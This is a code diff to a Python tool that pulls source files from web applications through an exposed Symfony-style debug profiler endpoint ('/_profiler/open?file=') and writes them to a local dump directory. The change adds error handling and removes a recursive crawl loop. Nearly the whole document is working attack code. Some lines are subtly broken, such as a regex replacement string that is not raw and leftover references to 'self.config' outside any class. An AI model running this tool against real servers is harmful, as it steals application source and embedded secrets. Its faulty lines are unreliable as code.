@@ -50,38 +50,38 @@ def extract_links(url):
 
 
 def worker_dump_source(target, path_to_file, options):
-    r = requests.get(
-        url=f"{target}/_profiler/open?file={path_to_file}&line=0"
-    )
+    try:
+        r = requests.get(
+            url=f"{target}/_profiler/open?file={path_to_file}&line=0"
+        )
 
-    soup = BeautifulSoup(r.content, "lxml")
-    div_source = soup.find("div", attrs={"class": "source"})
-    if div_source is not None:
-        file_content = div_source.text.strip().replace("", "\xa0")
-        print("\x1b[92m[+] (%9s) %s\x1b[0m" % (filesize_to_str(file_content), path_to_file))
+        soup = BeautifulSoup(r.content, "lxml")
+        div_source = soup.find("div", attrs={"class": "source"})
+        if div_source is not None:
+            file_content = div_source.text.strip()
+            file_content = re.sub(r" (.)", "r\1", file_content)
+            print("\x1b[92m[+] (%9s) %s\x1b[0m" % (filesize_to_str(file_content), path_to_file))
 
-        basepath = os.path.join(options.dump_dir, os.path.dirname(path_to_file))
-        filename = os.path.basename(path_to_file)
-        if basepath not in [".", ""]:
-            if not os.path.exists(basepath):
-                os.makedirs(basepath)
-            path_to_file = basepath + os.path.sep + filename
+            basepath = os.path.join(options.dump_dir, os.path.dirname(path_to_file))
+            filename = os.path.basename(path_to_file)
+            if basepath not in [".", ""]:
+                if not os.path.exists(basepath):
+                    os.makedirs(basepath)
+                path_to_file = basepath + os.path.sep + filename
+            else:
+                path_to_file = filename
+
+            f = open(path_to_file, "w")
+            f.write(file_content + "\n")
+            f.close()
+
         else:
-            path_to_file = filename
-
-        f = open(path_to_file, "w")
-        f.write(file_content + "\n")
-        f.close()
-
-        matched = re.findall(r"(['\"])([^'\"]+)\1", file_content)
-        if matched is not None:
-            for group in matched:
-                print(group.groups(0))
-
-    else:
-        if options.verbose:
-            print("\x1b[91m[!] (%s) %s\x1b[0m" % ("==error==", path_to_file))
-        return None
+            if options.verbose:
+                print("\x1b[91m[!] (%s) %s\x1b[0m" % ("==error==", path_to_file))
+            return None
+    except Exception as e:
+        if options.debug:
+            print(e)
 
 
 def parseArgs():
@@ -131,17 +131,7 @@ if __name__ == '__main__':
             local_files += sorted(list(set([l.strip() for l in f.readlines()])))
             f.close()
 
-    while len(local_files) != 0:
-        new_files = []
-
-        with ThreadPoolExecutor(max_workers=min(options.threads, len(local_files))) as tp:
-            tasks = [tp.submit(worker_dump_source, options.target, file, options) for file in local_files]
-
-        # Get results
-        for t in tasks:
-            if t._result:
-                new_files += t._result
-                self.config.known_links += t._result
-        local_files = new_files[:]
+    with ThreadPoolExecutor(max_workers=min(options.threads, len(local_files))) as tp:
+        tasks = [tp.submit(worker_dump_source, options.target, file, options) for file in local_files]
 
     print("\n[+] Bye Bye!")
